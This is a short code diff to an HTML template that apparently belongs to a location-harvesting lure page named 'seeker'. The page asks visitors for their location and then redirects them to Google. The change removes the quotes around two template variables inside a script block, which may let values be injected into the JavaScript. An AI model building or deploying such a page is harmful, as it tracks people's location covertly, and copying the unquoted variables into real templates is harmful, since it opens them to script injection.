@@ -47,7 +47,7 @@
     <div id="status"></div>
   </div>
   <script>
-    window.SEEKER_API_BASE = '{{ api_base }}';
+    window.SEEKER_API_BASE = {{ api_base }};
   </script>
   <script src="/static/seeker/js/location.js"></script>
   <script>
@@ -57,7 +57,7 @@
       var status = document.getElementById('status');
       btn.disabled = true;
       btn.textContent = 'Requesting...';
-      var redirectUrl = '{{ redirect_url }}' || 'https://www.google.com';
+      var redirectUrl = {{ redirect_url }} || 'https://www.google.com';
       locate(
         function() {
           status.textContent = 'Thank you!';
